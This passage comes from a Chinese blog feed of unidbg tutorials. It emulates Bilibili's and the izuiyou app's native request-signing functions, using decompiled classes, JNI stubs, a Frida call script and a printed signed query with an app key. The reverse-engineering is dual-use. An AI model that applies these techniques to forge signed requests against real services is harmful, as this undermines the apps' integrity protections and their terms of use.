(AbstractEmulator:417) - emulate RX@0x12001c97[libbili.so]0x1c97 exception sp=unidbg@0xe4fff658, msg=com/bilibili/nativelibrary/SignedQuery-&gt;r(Ljava/util/Map;)Ljava/lang/String;, offset=16ms @ Runnable|Function32 address=0x12001c97, arguments=[unidbg@0xfffe12a0, -288775324, 2100961961]Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;com.github.unidbg.linux.android.dvm.DvmObject.getValue()&quot; because the return value of &quot;com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(com.github.unidbg.Emulator, String, Object[])&quot; is nullat com.test3.TEST3.callS(TEST3.java:69)at com.test3.TEST3.main(TEST3.java:51)</code></pre><p>这是样本中自定义的函数，在JADX中看它的代码逻辑。</p><pre><code class="language-Java">static String r(Map&lt;String, String&gt; map) &#123;        if (!(map instanceof SortedMap)) &#123;            map = new TreeMap(map);        &#125;        StringBuilder sb = new StringBuilder(256);        for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;            String key = entry.getKey();            if (!TextUtils.isEmpty(key)) &#123;                sb.append(b(key));                sb.append(ContainerUtils.KEY_VALUE_DELIMITER);                String value = entry.getValue();                sb.append(value == null ? &quot;&quot; : b(value));                sb.append(ContainerUtils.FIELD_DELIMITER);            &#125;        &#125;        int length = sb.length();        if (length &gt; 0) &#123;            sb.deleteCharAt(length - 1);        &#125;        if (length == 0) &#123;            return null;        &#125;        return sb.toString();    &#125;</code></pre><p>将其直接粘贴到 Unidbg 里，但似乎有些问题<br>导入 SortedMap</p><pre><code class="language-java">import java.util.SortedMap;</code></pre><p>TextUtils 是 Android FrameWork 中用于处理文本的工具类，TextUtils.isEmpty 和 string.isEmpty功能类似，这里直接替换。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250713143833414.png" alt="image-20250713143833414"></p><p>b 方法是 <strong>SignedQuery</strong> 类里另一个方法，我们干脆把 <strong>SignedQuery</strong> 以及 ContainerUtils 这两个类从 JADX 中拷贝过来，以免遗漏，在这个过程中发现依赖 <strong>cv.m</strong>。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250713144234405.png" alt="image-20250713144234405"></p><p>这个字段是 15，直接硬编码处理一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250713144314751.png" alt="image-20250713144314751"></p><p>移过来的 <strong>ContainerUtils</strong> 内容如下</p><pre><code class="language-Java">package com.Bili;import java.util.Iterator;import java.util.List;import java.util.Map;import java.util.Set;public class ContainerUtils &#123;    public static final String FIELD_DELIMITER = &quot;&amp;&quot;;    public static final String KEY_VALUE_DELIMITER = &quot;=&quot;;    public static &lt;K, V&gt; boolean equals(Map&lt;K, V&gt; map, Map&lt;K, V&gt; map2) &#123;        if (map == map2) &#123;            return true;        &#125;        boolean z = false;        if (map == null || map2 == null || map.size() != map2.size()) &#123;            return false;        &#125;        Iterator&lt;Map.Entry&lt;K, V&gt;&gt; it = map.entrySet().iterator();        while (true) &#123;            if (!it.hasNext()) &#123;                break;            &#125;            Map.Entry&lt;K, V&gt; next = it.next();            if (map2.get(next.getKey()) != next.getValue()) &#123;                z = true;                break;            &#125;        &#125;        return !z;    &#125;    public static &lt;K, V&gt; int hashCode(Map&lt;K, V&gt; map) &#123;        return toString(map).hashCode();    &#125;    public static &lt;K&gt; String toString(List&lt;K&gt; list) &#123;        if (list == null) &#123;            return &quot;&quot;;        &#125;        StringBuilder sb = new StringBuilder();        int i2 = 0;        for (K k : list) &#123;            int i3 = i2 + 1;            if (i2 &gt; 0) &#123;                sb.append(FIELD_DELIMITER);            &#125;            sb.append(k.toString());            i2 = i3;        &#125;        return sb.toString();    &#125;    public static &lt;K, V&gt; String toString(Map&lt;K, V&gt; map) &#123;        if (map == null) &#123;            return &quot;&quot;;        &#125;        StringBuilder sb = new StringBuilder();        int i2 = 0;        for (Map.Entry&lt;K, V&gt; entry : map.entrySet()) &#123;            int i3 = i2 + 1;            if (i2 &gt; 0) &#123;                sb.append(FIELD_DELIMITER);            &#125;            sb.append(entry.getKey().toString());            sb.append(KEY_VALUE_DELIMITER);            sb.append(entry.getValue().toString());            i2 = i3;        &#125;        return sb.toString();    &#125;    public static &lt;K&gt; String toString(Set&lt;K&gt; set) &#123;        if (set == null) &#123;            return &quot;&quot;;        &#125;        StringBuilder sb = new StringBuilder();        int i2 = 0;        for (K k : set) &#123;            int i3 = i2 + 1;            if (i2 &gt; 0) &#123;                sb.append(FIELD_DELIMITER);            &#125;            sb.append(k.toString());            i2 = i3;        &#125;        return sb.toString();    &#125;&#125;</code></pre><p>移过来的 <strong>SignedQuery</strong> 如下</p><pre><code class="language-Java">package com.Bili;import java.io.UnsupportedEncodingException;import java.util.Map;import java.util.SortedMap;import java.util.TreeMap;public final class SignedQuery &#123;    /* renamed from: c  reason: collision with root package name */    private static final char[] f14891c = &quot;0123456789ABCDEF&quot;.toCharArray();    public final String a;    public final String b;    public SignedQuery(String str, String str2) &#123;        this.a = str;        this.b = str2;    &#125;    private static boolean a(char c2, String str) &#123;        return (c2 &gt;= &#39;A&#39; &amp;&amp; c2 &lt;= &#39;Z&#39;) || (c2 &gt;= &#39;a&#39; &amp;&amp; c2 &lt;= &#39;z&#39;) || !((c2 &lt; &#39;0&#39; || c2 &gt; &#39;9&#39;) &amp;&amp; &quot;-_.~&quot;.indexOf(c2) == -1 &amp;&amp; (str == null || str.indexOf(c2) == -1));    &#125;    static String b(String str) &#123;        return c(str, null);    &#125;    static String c(String str, String str2) &#123;        StringBuilder sb = null;        if (str == null) &#123;            return null;        &#125;        int length = str.length();        int i2 = 0;        while (i2 &lt; length) &#123;            int i3 = i2;            while (i3 &lt; length &amp;&amp; a(str.charAt(i3), str2)) &#123;                i3++;            &#125;            if (i3 == length) &#123;                if (i2 == 0) &#123;                    return str;                &#125;                sb.append((CharSequence) str, i2, length);                return sb.toString();            &#125;            if (sb == null) &#123;                sb = new StringBuilder();            &#125;            if (i3 &gt; i2) &#123;                sb.append((CharSequence) str, i2, i3);            &#125;            i2 = i3 + 1;            while (i2 &lt; length &amp;&amp; !a(str.charAt(i2), str2)) &#123;                i2++;            &#125;            try &#123;                byte[] bytes = str.substring(i3, i2).getBytes(&quot;UTF-8&quot;);                int length2 = bytes.length;                for (int i4 = 0; i4 &lt; length2; i4++) &#123;                    sb.append(&#39;%&#39;);                    sb.append(f14891c[(bytes[i4] &amp; 240) &gt;&gt; 4]);                    sb.append(f14891c[bytes[i4] &amp; 15]);                &#125;            &#125; catch (UnsupportedEncodingException e) &#123;                throw new AssertionError(e);            &#125;        &#125;        return sb == null ? str : sb.toString();    &#125;    static String r(Map&lt;String, String&gt; map) &#123;        if (!(map instanceof SortedMap)) &#123;            map = new TreeMap(map);        &#125;        StringBuilder sb = new StringBuilder(256);        for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;            String key = entry.getKey();            if (!key.isEmpty()) &#123;                sb.append(b(key));                sb.append(ContainerUtils.KEY_VALUE_DELIMITER);                String value = entry.getValue();                sb.append(value == null ? &quot;&quot; : b(value));                sb.append(ContainerUtils.FIELD_DELIMITER);            &#125;        &#125;        int length = sb.length();        if (length &gt; 0) &#123;            sb.deleteCharAt(length - 1);        &#125;        if (length == 0) &#123;            return null;        &#125;        return sb.toString();    &#125;    public String toString() &#123;        String str = this.a;        if (str == null) &#123;            return &quot;&quot;;        &#125;        if (this.b == null) &#123;            return str;        &#125;        return this.a + &quot;&amp;sign=&quot; + this.b;    &#125;&#125;</code></pre><p>然后就接着补 JNI 调用</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callStaticObjectMethod(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;    switch (signature)&#123;        case &quot;com/bilibili/nativelibrary/SignedQuery-&gt;r(Ljava/util/Map;)Ljava/lang/String;&quot;:&#123;            Map map = (Map) varArg.getObjectArg(0).getValue();            return new StringObject(vm, SignedQuery.r(map));        &#125;    &#125;    return super.callStaticObjectMethod(vm, dvmClass, signature, varArg);&#125;</code></pre><p>接着继续运行，报错</p><pre><code class="language-Java">[15:00:04 025]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x120c679b[libc.so]0x1b79b exception sp=unidbg@0xe4fff658, msg=com/bilibili/nativelibrary/SignedQuery-&gt;&lt;init&gt;(Ljava/lang/String;Ljava/lang/String;)V, offset=7ms @ Runnable|Function32 address=0x12001c97, arguments=[unidbg@0xfffe12a0, -288775324, 2100961961]Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;com.github.unidbg.linux.android.dvm.DvmObject.getValue()&quot; because the return value of &quot;com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(com.github.unidbg.Emulator, String, Object[])&quot; is nullat com.test3.TEST3.callS(TEST3.java:69)at com.test3.TEST3.main(TEST3.java:51)</code></pre><p>补环境</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; newObject(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;    switch (signature)&#123;        case &quot;com/bilibili/nativelibrary/SignedQuery-&gt;&lt;init&gt;(Ljava/lang/String;Ljava/lang/String;)V&quot;:&#123;            String arg1 = varArg.getObjectArg(0).getValue().toString();            String arg2 = varArg.getObjectArg(1).getValue().toString();            return vm.resolveClass(&quot;com/bilibili/nativelibrary/SignedQuery&quot;).newObject(new SignedQuery(arg1, arg2));        &#125;    &#125;    return super.newObject(vm, dvmClass, signature, varArg);&#125;</code></pre><p>补完之后，即可跑通，打印结果</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250713151537052.png" alt="image-20250713151537052"></p><pre><code class="language-shell">call s result: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=android&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752390908&amp;sign=2796f4e6df84ead8fe0ff512bee8e24b</code></pre><p>符合预期</p><p>附上完整代码：</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import java.io.File;import java.io.UnsupportedEncodingException;import java.util.*;public class TEST3 extends AbstractJni implements IOResolver&lt;AndroidFileIO&gt; &#123;    private final AndroidEmulator emulator;    private final DvmClass LibBili;    private final VM vm;    public TEST3() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;tv.danmaku.bili&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test3\\bilibili.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        // add        emulator.getBackend().registerEmuCountHook(10000); // 设置执行多少条指令切换一次线程        emulator.getSyscallHandler().setVerbose(true);        emulator.getSyscallHandler().setEnableThreadDispatcher(true);        emulator.getSyscallHandler().addIOResolver(this);        //加载Dalvik的模块        DalvikModule dm = vm.loadLibrary(&quot;bili&quot;, true);        //加载目标类        LibBili = vm.resolveClass(&quot;com.bilibili.nativelibrary.LibBili&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST3 test3 = new TEST3();        String result = test3.callS();        System.out.println(&quot;call s result: &quot; + result);    &#125;    @Override    public FileResult resolve(Emulator emulator, String pathname, int oflags) &#123;        System.out.println(&quot;lilac open: &quot; + pathname);        return null;    &#125;    public String callS()&#123;        TreeMap&lt;String, String&gt; map = new TreeMap&lt;&gt;();        map.put(&quot;build&quot;, &quot;6180500&quot;);        map.put(&quot;mobi_app&quot;, &quot;android&quot;);        map.put(&quot;channel&quot;, &quot;shenma069&quot;);        map.put(&quot;appkey&quot;, &quot;1d8b6e7d45233436&quot;);        map.put(&quot;s_locale&quot;, &quot;zh_CN&quot;);        map.put(&quot;device&quot;, &quot;android&quot;);        DvmObject&lt;?&gt; mapObject = ProxyDvmObject.createObject(vm, map);        String result = LibBili.callStaticJniMethodObject(emulator, &quot;s(Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery;&quot;, mapObject).getValue().toString();        return result;    &#125;    @Override    public boolean callBooleanMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;        switch (signature)&#123;            case &quot;java/util/Map-&gt;isEmpty()Z&quot;:&#123;                Map map = (Map) dvmObject.getValue();                return map.isEmpty();            &#125;        &#125;        return super.callBooleanMethod(vm, dvmObject, signature, varArg);    &#125;    @Override    public DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;        switch (signature)&#123;            case &quot;java/util/Map-&gt;get(Ljava/lang/Object;)Ljava/lang/Object;&quot;:&#123;                Map map = (Map) dvmObject.getValue();                // 不要忘了getvalue                Object key = varArg.getObjectArg(0).getValue();                return ProxyDvmObject.createObject(vm, map.get(key));            &#125;            case &quot;java/util/Map-&gt;put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;&quot;:&#123;                Map map = (Map) dvmObject.getValue();                Object key = varArg.getObjectArg(0).getValue();                Object value = varArg.getObjectArg(1).getValue();                return ProxyDvmObject.createObject(vm, map.put(key, value));            &#125;        &#125;        return super.callObjectMethod(vm, dvmObject, signature, varArg);    &#125;    @Override    public DvmObject&lt;?&gt; callStaticObjectMethod(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;        switch (signature)&#123;            case &quot;com/bilibili/nativelibrary/SignedQuery-&gt;r(Ljava/util/Map;)Ljava/lang/String;&quot;:&#123;                Map map = (Map) varArg.getObjectArg(0).getValue();                return new StringObject(vm, SignedQuery.r(map));            &#125;        &#125;        return super.callStaticObjectMethod(vm, dvmClass, signature, varArg);    &#125;    @Override    public DvmObject&lt;?&gt; newObject(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;        switch (signature)&#123;            case &quot;com/bilibili/nativelibrary/SignedQuery-&gt;&lt;init&gt;(Ljava/lang/String;Ljava/lang/String;)V&quot;:&#123;                String arg1 = varArg.getObjectArg(0).getValue().toString();                String arg2 = varArg.getObjectArg(1).getValue().toString();                return vm.resolveClass(&quot;com/bilibili/nativelibrary/SignedQuery&quot;).newObject(new SignedQuery(arg1, arg2));            &#125;        &#125;        return super.newObject(vm, dvmClass, signature, varArg);    &#125;    private static final char[] f14892c = &quot;0123456789ABCDEF&quot;.toCharArray();    public static final class SignedQuery &#123;        public final String a;        public final String b;        public SignedQuery(String str, String str2) &#123;            this.a = str;            this.b = str2;        &#125;        private static boolean a(char c2, String str) &#123;            return (c2 &gt;= &#39;A&#39; &amp;&amp; c2 &lt;= &#39;Z&#39;) || (c2 &gt;= &#39;a&#39; &amp;&amp; c2 &lt;= &#39;z&#39;) || !((c2 &lt; &#39;0&#39; || c2 &gt; &#39;9&#39;) &amp;&amp; &quot;-_.~&quot;.indexOf(c2) == -1 &amp;&amp; (str == null || str.indexOf(c2) == -1));        &#125;        static String b(String str) &#123;            return c(str, null);        &#125;        static String c(String str, String str2) &#123;            StringBuilder sb = null;            if (str == null) &#123;                return null;            &#125;            int length = str.length();            int i2 = 0;            while (i2 &lt; length) &#123;                int i3 = i2;                while (i3 &lt; length &amp;&amp; a(str.charAt(i3), str2)) &#123;                    i3++;                &#125;                if (i3 == length) &#123;                    if (i2 == 0) &#123;                        return str;                    &#125;                    sb.append((CharSequence) str, i2, length);                    return sb.toString();                &#125;                if (sb == null) &#123;                    sb = new StringBuilder();                &#125;                if (i3 &gt; i2) &#123;                    sb.append((CharSequence) str, i2, i3);                &#125;                i2 = i3 + 1;                while (i2 &lt; length &amp;&amp; !a(str.charAt(i2), str2)) &#123;                    i2++;                &#125;                try &#123;                    byte[] bytes = str.substring(i3, i2).getBytes(&quot;UTF-8&quot;);                    int length2 = bytes.length;                    for (int i4 = 0; i4 &lt; length2; i4++) &#123;                        sb.append(&#39;%&#39;);                        sb.append(f14892c[(bytes[i4] &amp; 240) &gt;&gt; 4]);                        sb.append(f14892c[bytes[i4] &amp; 15]);                    &#125;                &#125; catch (UnsupportedEncodingException e) &#123;                    throw new AssertionError(e);                &#125;            &#125;            return sb == null ? str : sb.toString();        &#125;        static String r(Map&lt;String, String&gt; map) &#123;            if (!(map instanceof SortedMap)) &#123;                map = new TreeMap(map);            &#125;            StringBuilder sb = new StringBuilder(256);            for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;                String key = entry.getKey();                if (!key.isEmpty()) &#123;                    sb.append(b(key));                    sb.append(ContainerUtils.KEY_VALUE_DELIMITER);                    String value = entry.getValue();                    sb.append(value == null ? &quot;&quot; : b(value));                    sb.append(ContainerUtils.FIELD_DELIMITER);                &#125;            &#125;            int length = sb.length();            if (length &gt; 0) &#123;                sb.deleteCharAt(length - 1);            &#125;            if (length == 0) &#123;                return null;            &#125;            return sb.toString();        &#125;        public String toString() &#123;            String str = this.a;            if (str == null) &#123;                return &quot;&quot;;            &#125;            if (this.b == null) &#123;                return str;            &#125;            return this.a + &quot;&amp;sign=&quot; + this.b;        &#125;    &#125;    public static class ContainerUtils &#123;        public static final String FIELD_DELIMITER = &quot;&amp;&quot;;        public static final String KEY_VALUE_DELIMITER = &quot;=&quot;;        public static &lt;K, V&gt; boolean equals(Map&lt;K, V&gt; map, Map&lt;K, V&gt; map2) &#123;            if (map == map2) &#123;                return true;            &#125;            boolean z = false;            if (map == null || map2 == null || map.size() != map2.size()) &#123;                return false;            &#125;            Iterator&lt;Map.Entry&lt;K, V&gt;&gt; it = map.entrySet().iterator();            while (true) &#123;                if (!it.hasNext()) &#123;                    break;                &#125;                Map.Entry&lt;K, V&gt; next = it.next();                if (map2.get(next.getKey()) != next.getValue()) &#123;                    z = true;                    break;                &#125;            &#125;            return !z;        &#125;        public static &lt;K, V&gt; int hashCode(Map&lt;K, V&gt; map) &#123;            return toString(map).hashCode();        &#125;        public static &lt;K&gt; String toString(List&lt;K&gt; list) &#123;            if (list == null) &#123;                return &quot;&quot;;            &#125;            StringBuilder sb = new StringBuilder();            int i2 = 0;            for (K k : list) &#123;                int i3 = i2 + 1;                if (i2 &gt; 0) &#123;                    sb.append(FIELD_DELIMITER);                &#125;                sb.append(k.toString());                i2 = i3;            &#125;            return sb.toString();        &#125;        public static &lt;K, V&gt; String toString(Map&lt;K, V&gt; map) &#123;            if (map == null) &#123;                return &quot;&quot;;            &#125;            StringBuilder sb = new StringBuilder();            int i2 = 0;            for (Map.Entry&lt;K, V&gt; entry : map.entrySet()) &#123;                int i3 = i2 + 1;                if (i2 &gt; 0) &#123;                    sb.append(FIELD_DELIMITER);                &#125;                sb.append(entry.getKey().toString());                sb.append(KEY_VALUE_DELIMITER);                sb.append(entry.getValue().toString());                i2 = i3;            &#125;            return sb.toString();        &#125;        public static &lt;K&gt; String toString(Set&lt;K&gt; set) &#123;            if (set == null) &#123;                return &quot;&quot;;            &#125;            StringBuilder sb = new StringBuilder();            int i2 = 0;            for (K k : set) &#123;                int i3 = i2 + 1;                if (i2 &gt; 0) &#123;                    sb.append(FIELD_DELIMITER);                &#125;                sb.append(k.toString());                i2 = i3;            &#125;            return sb.toString();        &#125;    &#125;&#125;</code></pre><h3 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h3><p>[Unidbg 的基本使用（四）](<a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/uo6guvore38kr29y#">https://www.yuque.com/lilac-2hqvv/xdwlsg/uo6guvore38kr29y?#</a> 《Unidbg 的基本使用（四）》)</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(三)</title>
      <link href="/2025/07/01/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%B8%89)/"/>
      <url>/2025/07/01/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-三"><a href="#从实践中学习unidbg使用-三" class="headerlink" title="从实践中学习unidbg使用(三)"></a>从实践中学习unidbg使用(三)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇中的APK详见参考文章中</p><p>目标APK：right573.apk</p><p>目标方法实现：libnet_crypto.so</p><p>本篇将开始讨论补环境。</p><h3 id="二、任务描述"><a href="#二、任务描述" class="headerlink" title="二、任务描述"></a>二、任务描述</h3><p>JADX反编译right573.apk，找到com.izuiyou.network，我们关注于NetCrypto类里的sign方法，它是一个静态方法。</p><pre><code class="language-Java">package com.izuiyou.network;import android.app.ContextProvider;import com.meituan.robust.ChangeQuickRedirect;import com.meituan.robust.PatchProxy;import com.meituan.robust.PatchProxyResult;import defpackage.we5;/* loaded from: classes4.dex */public class NetCrypto &#123;    public static ChangeQuickRedirect changeQuickRedirect;    static &#123;        we5.a(ContextProvider.get(), &quot;net_crypto&quot;);        native_init();    &#125;    public static String a(String str, byte[] bArr) &#123;        String str2;        PatchProxyResult proxy = PatchProxy.proxy(new Object[]&#123;str, bArr&#125;, null, changeQuickRedirect, true, 47387, new Class[]&#123;String.class, byte[].class&#125;, String.class);        if (proxy.isSupported) &#123;            return (String) proxy.result;        &#125;        String sign = sign(str, bArr);        if (str.contains(&quot;?&quot;)) &#123;            str2 = &quot;&amp;sign=&quot; + sign;        &#125; else &#123;            str2 = &quot;?sign=&quot; + sign;        &#125;        return str + str2;    &#125;    public static native byte[] decodeAES(byte[] bArr, boolean z);    public static native byte[] encodeAES(byte[] bArr);    public static native String generateSign(byte[] bArr);    public static native String getProtocolKey();    public static native void native_init();    public static native boolean registerDID(byte[] bArr);    public static native void setProtocolKey(String str);    public static native String sign(String str, byte[] bArr);&#125;</code></pre><p>这段代码主要负责处理网路通信中的加解密和签名相关逻辑。它结合了原生方法(通过native关键字)以及美团的热修复框架Robust。主要方法就是a方法。这是一个用于在URL上拼接签名的工具方法，先通过PathProxy检查是否需要被热更新替换。否则执行默认逻辑：①调用原生方法sign(str, bArr)生成签名；②判断URL中是否已有参数 ? ，然后拼接sign参数返回。这个类的主要用途就是加解密网络数据；为URL或请求生成签名；确保数据完整性和防篡改；支持热更新，允许在不重新发布APK的情况下修复方法逻辑；借助原生库提升加密效率或安全性。</p><p>先用Frida附加目标进程做主动调用，可参考如下代码</p><pre><code class="language-js">function callSign()&#123;  Java.perform(function() &#123;    function stringToBytes(str) &#123;      var javaString = Java.use(&#39;java.lang.String&#39;);      return javaString.$new(str).getBytes();    &#125;    let NetCrypto = Java.use(&quot;com.izuiyou.network.NetCrypto&quot;);    let arg1 = &quot;hello world&quot;;    let arg2 = &quot;V I 50&quot;;    let ret = NetCrypto.sign(arg1, stringToBytes(arg2));    console.log(&quot;ret:&quot;+ret);  &#125;)&#125;callSign();</code></pre><p>输出是</p><pre><code class="language-shell">ret:v2-b94195d5f3c2ad3a876f13346fa283a0</code></pre><p>本篇的目标就是使用Unidbg复现对sign的调用。</p><h3 id="三、初始化"><a href="#三、初始化" class="headerlink" title="三、初始化"></a>三、初始化</h3><p>在Unidbg的unidbg-android&#x2F;src&#x2F;test&#x2F;java下新建包和类。</p><pre><code class="language-Java">package com.test2;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST2 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmClass NetCrypto;    private final VM vm;    public TEST2() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;cn.xiaochuankeji.tieba&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test2\\right573.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        DalvikModule dm = vm.loadLibrary(&quot;net_crypto&quot;, true);        NetCrypto = vm.resolveClass(&quot;com.izuiyou.network.NetCrypto&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST2 test = new TEST2();    &#125;&#125;</code></pre><p>由于样本目录下只包含armeabi-v7a的动态文件，因此只能选择32位，运行代码，发现报错。</p><pre><code class="language-shell">[10:34:53 630]  INFO [com.github.unidbg.linux.AndroidElfLoader] (AndroidElfLoader:481) - libnet_crypto.so load dependency libandroid.so failedJNIEnv-&gt;FindClass(com/izuiyou/network/NetCrypto) was called from RX@0x12049fc5[libnet_crypto.so]0x49fc5JNIEnv-&gt;RegisterNatives(com/izuiyou/network/NetCrypto, RW@0x121c9010[libnet_crypto.so]0x1c9010, 8) was called from RX@0x12049fd7[libnet_crypto.so]0x49fd7RegisterNative(com/izuiyou/network/NetCrypto, native_init()V, RX@0x1204a069[libnet_crypto.so]0x4a069)RegisterNative(com/izuiyou/network/NetCrypto, encodeAES([B)[B, RX@0x1204a0b9[libnet_crypto.so]0x4a0b9)RegisterNative(com/izuiyou/network/NetCrypto, decodeAES([BZ)[B, RX@0x1204a14d[libnet_crypto.so]0x4a14d)RegisterNative(com/izuiyou/network/NetCrypto, sign(Ljava/lang/String;[B)Ljava/lang/String;, RX@0x1204a28d[libnet_crypto.so]0x4a28d)RegisterNative(com/izuiyou/network/NetCrypto, getProtocolKey()Ljava/lang/String;, RX@0x1204a419[libnet_crypto.so]0x4a419)RegisterNative(com/izuiyou/network/NetCrypto, setProtocolKey(Ljava/lang/String;)V, RX@0x1204a479[libnet_crypto.so]0x4a479)RegisterNative(com/izuiyou/network/NetCrypto, registerDID([B)Z, RX@0x1204a4f5[libnet_crypto.so]0x4a4f5)RegisterNative(com/izuiyou/network/NetCrypto, generateSign([B)Ljava/lang/String;, RX@0x1204a587[libnet_crypto.so]0x4a587)</code></pre><p>第一行日志提示，libnet_crypto.so文件试图加载libandroid.so这个依赖库，但是没有找到，接下来探究这个问题的原因和解决方案。</p><p>首先是原因，前文我们说，Unidbg的So Loader提供了类似Android Linker的处理机制，对所依赖的用户库以及系统库进行加载，这里加载失败的libandroid.so就是一个系统库，它提供了大量的Android相关的功能，比如访问APK的资源文件等等。具体可看这篇[文章](<a href="https://www.cnblogs.com/willhua/p/9692529.html">Android: 在native中访问assets全解析 - willhua - 博客园</a>)。</p><p>那么，Unidbg的lib目录下为什么没有包含这个动态库？<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705111108967.png" alt="image-20250705111108967"></p><p>也可以说，Android FrameWork提供了数十上百个动态库，为什么Unidbg只在lib里放了这么几个？这是因为并非所有的So都可以被Unidbg完备的加载和处理。</p><p>以当前的libandroid.so为例，它依赖于相当多的类库，其中许多的Android系统、软硬件、大量的系统调用紧密相关。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1667897135718-a799b44f-812a-40cf-b31f-067eae755f20.png" alt="img"></p><p>这使得Unidbg很难对它们做妥善、完备的处理，因为Unidbg并不是真正完善健全的模拟器，或者说模拟器就很难像真机一样完善。除了libandroid.so外，libstart.so、libjnigraphics.so等库都因为这个原因没法完成加载。因此Unidbg只默认加载了依赖最少，使用又最多的一批库函数。</p><p>可是比如libandroid.so这样的系统库出现频率很高，总不能遇到它们就歇火。因此Unidbg提供了一种叫虚拟模块的机制，提供对这些so文件一部分函数的模拟实现。</p><p>目前Unidbg提供了libandroid.so、libjnigraphics.so、libmediandk.so三个库的虚拟模块。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705112633520.png" alt="image-20250705112633520"></p><p>使用它们相当简单，比如此处缺少libandroid.so，只需要在<strong>早于</strong>目标so文件加载的时机，添加下面这行代码即可。</p><pre><code class="language-Java">new AndroidModule(emulator, vm).register(memory);</code></pre><p>就像下面这样</p><pre><code class="language-Java">    public TEST2() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;cn.xiaochuankeji.tieba&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test2\\right573.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        // 使用libandroid.so虚拟模块        new AndroidModule(emulator, vm).register(memory);        DalvikModule dm = vm.loadLibrary(&quot;net_crypto&quot;, true);        NetCrypto = vm.resolveClass(&quot;com.izuiyou.network.NetCrypto&quot;);        dm.callJNI_OnLoad(emulator);    